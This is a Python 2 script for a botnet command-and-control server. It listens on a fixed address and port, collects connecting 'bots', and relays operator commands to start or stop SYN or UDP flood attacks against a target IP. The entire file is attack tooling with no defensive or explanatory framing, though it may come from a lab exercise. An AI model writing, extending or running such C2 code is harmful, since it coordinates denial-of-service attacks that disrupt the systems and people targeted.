# -*- coding: utf-8 -*- 

# This will be the command server, talking to our bots (attackers)
import sys
import thread
import socket
import subprocess
import time

# List of connected bots
bots = []

PORT = 666
HOST = '192.168.2.2'
#HOST = '127.0.0.1'

# Read input from terminal, and send commands to the bots
def readCommands():
	while True:
		inString = raw_input('>>')

		
		NumberofFields = inString.count(' ') + 1

		if NumberofFields == 3:
			command, atkType, victim = inString.split(' ')
			print 'Command: ' + command
			print 'Attack: ' + atkType
			print 'Target: ' + victim
		elif NumberofFields == 2:
			command, victim = inString.split(' ')
			print 'Command: ' + command
			print 'Target: ' + victim

		if command == 'start':
			for bot in bots:
				bot.send('START' + '/' + atkType + '/' + victim)
		elif command == 'stop':
			for bot in bots:
				bot.send('STOP' + '/' + victim)

#Host a server, listening for bots to make a connection
if __name__=='__main__':
	#Server
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
	serversocket.bind((HOST, PORT))
	serversocket.listen(999)

	print 'Running server on: ' + HOST 
	
	botsLoggerFile = open("output", "w")
	# Open xterm window with logs from that file
	p = subprocess.Popen(["xterm", "-e", "tail", "-f", "output"])
	print '\n'
	time.sleep(0.5)
	thread.start_new_thread(readCommands, ())

	print 'Command: <start or stop> <syn or udp> <targetIP>'

	while 1:
		botsock, addr = serversocket.accept()
		bots.append(botsock)
		botsLoggerFile.write('Bot connected: ' + str(addr) + '\n')
		botsLoggerFile.flush()

